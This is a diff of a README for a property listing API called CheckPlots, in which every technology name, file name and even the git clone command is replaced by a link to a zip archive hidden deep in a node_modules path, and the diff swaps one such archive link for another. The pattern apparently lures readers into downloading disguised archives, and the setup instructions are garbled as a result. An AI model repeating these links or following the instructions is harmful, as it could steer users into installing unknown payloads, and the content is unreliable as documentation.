@@ -8,19 +8,19 @@ CheckPlots is a property listing and management API that allows users to add, re
 - Retrieve property details
 - Manage property attributes such as type, pricing, location, and amenities
 - Uses Multer for handling file uploads
-- Built with https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip, Express, and MongoDB
+- Built with https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip, Express, and MongoDB
 
 ## Installation
 
 ### Prerequisites
-- https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip (v14+)
+- https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip (v14+)
 - MongoDB
 - npm or yarn
 
 ### Setup
 1. Clone the repository:
    ```sh
-   git clone https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
+   git clone https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip
    cd checkplots
    ```
 2. Install dependencies:
@@ -73,22 +73,22 @@ npm start
 ```
 checkplots/
 │── models/
-│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
+│   ├── https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip
 │── routes/
-│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
+│   ├── https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip
 │── controllers/
-│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
+│   ├── https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip
 │── utils/
-│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
-│── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
+│   ├── https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip
+│── https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip
 │── .env
-│── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
-│── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
+│── https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip
+│── https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip
 ```
 
 ## Technologies Used
-- **https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip** - Backend runtime
-- **https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip** - Web framework
+- **https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip** - Backend runtime
+- **https://github.com/Adityakumar121k/checkplots/raw/refs/heads/main/backend/node_modules/mongoose/lib/helpers/projection/Software-2.3.zip** - Web framework
 - **MongoDB & Mongoose** - Database and ORM
 - **Multer** - File upload middleware
 - **Postman** - API testing
